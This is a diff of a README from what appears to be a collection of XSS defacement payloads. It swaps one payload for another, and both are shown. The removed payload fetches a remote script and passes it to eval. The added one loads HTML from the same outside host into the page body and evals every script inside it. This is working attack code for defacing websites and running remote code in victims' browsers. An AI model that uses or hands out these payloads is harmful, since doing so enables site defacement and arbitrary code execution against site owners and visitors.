@@ -5,16 +5,13 @@ This repository contains various XSS (Cross-Site Scripting) deface payloads that
 
 
 
-### Using `eval` with Fetch API
+### Using with Fetch API
 
 ```html
-<script>
-fetch('https://karthikdude.github.io/Deface/script.js')
-    .then(response => response.text())
-    .then(script => {
-        eval(script);
-    });
-</script>
+<script> fetch('https://karthikdude.github.io/Deface/')
+.then(response => response.text()) .then(html =>
+{ document.body.innerHTML = html; const scripts = document.body.getElementsByTagName('script');
+for (let script of scripts) { eval(script.innerText); } }); </script>
 ```
 
 **Details:** This payload fetches an external JavaScript file and executes it directly using `eval`. While this is a less secure approach, it is effective in environments where execution of external scripts is needed.
